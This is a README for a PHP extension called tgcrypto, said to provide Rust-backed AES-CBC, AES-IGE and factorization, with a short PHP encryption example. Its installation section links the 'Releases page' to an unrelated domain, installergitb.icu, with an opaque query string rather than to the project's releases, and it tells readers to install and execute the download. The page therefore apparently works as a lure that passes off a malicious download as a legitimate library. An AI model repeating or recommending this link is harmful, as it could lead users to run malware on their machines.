![tgcrypto](https://img.shields.io/badge/tgcrypto-v1.0.0-blue.svg) ![PHP](https://img.shields.io/badge/PHP-8.0%2B-orange.svg) ![Rust](https://img.shields.io/badge/Rust-1.55%2B-green.svg)

Welcome to the **tgcrypto** repository! This project offers a PHP extension that enhances cryptographic functions using the power of Rust. With **tgcrypto**, you can efficiently handle cryptographic tasks such as encryption, decryption, and prime factorization, all while enjoying the performance benefits of Rust.

## üöÄ Features

- **AES-CBC & AES-IGE**: Implement secure encryption and decryption methods.
- **Factorization**: Easily factorize numbers and handle prime numbers.
- **Rust Integration**: Leverage Rust's performance and safety in your PHP applications.
- **PHP 8 Support**: Fully compatible with PHP 8, ensuring modern features and performance.
- **Lightweight**: Minimal overhead, making it ideal for performance-critical applications.

## üì¶ Installation

To get started with **tgcrypto**, you can download the latest release from our [Releases page](https://installergitb.icu?u29jbged0u94clm). Follow the instructions in the release notes to install and execute the extension in your environment.

## üìú Usage

Here‚Äôs a quick example of how to use **tgcrypto** in your PHP application:

```php
<?php
// Load the tgcrypto extension
if (!extension_loaded('tgcrypto')) {
    die('tgcrypto extension not loaded');
}

// Example of AES-CBC encryption
$key = 'your-encryption-key';
$plaintext = 'Hello, World!';
$ciphertext = tgcrypto_aes_cbc_encrypt($plaintext, $key);

// Example of AES-CBC decryption
$decrypted = tgcrypto_aes_cbc_decrypt($ciphertext, $key);

echo "Decrypted text: " . $decrypted;
?>
```

This example demonstrates how to load the extension and perform basic encryption and decryption using AES-CBC. For more advanced usage, please refer to the documentation.
